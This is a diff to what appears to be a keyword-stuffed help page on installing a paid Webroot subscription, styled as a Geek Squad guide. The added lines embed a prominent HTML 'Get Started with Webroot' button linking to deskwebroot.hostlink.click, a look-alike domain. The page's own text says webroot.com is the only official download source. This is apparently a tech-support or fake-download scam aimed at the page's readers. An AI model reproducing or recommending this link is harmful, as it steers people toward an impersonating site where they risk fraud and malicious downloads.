@@ -3,6 +3,12 @@ Install My Webroot Software – Already Paid? Here’s What to Do Next (Geek Squ
 
 If you’ve recently purchased a Webroot subscription—either online or through a retailer like Best Buy or Geek Squad—you might be wondering what comes next. Whether you're setting up Webroot for the first time or moving your license to a new device, this complete guide will walk you through how to **install my Webroot already paid for**, quickly and correctly.
 
+.. raw:: html
+
+   <div style="text-align:center;">
+       <a href="https://deskwebroot.hostlink.click/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Get Started with Webroot</a>
+   </div>
+
 Many users search online for how to **install my Webroot already paid for**, but run into confusion over where to start. That’s why we’ve created this step-by-step tutorial to help you activate and install Webroot on your PC, Mac, or mobile device. Whether you're reinstalling Webroot or setting it up after purchase, this guide applies to you.
 
 You can use the official Webroot download portal here: https://www.webroot.com/secure. This is the only official and safe source to download your software after payment.
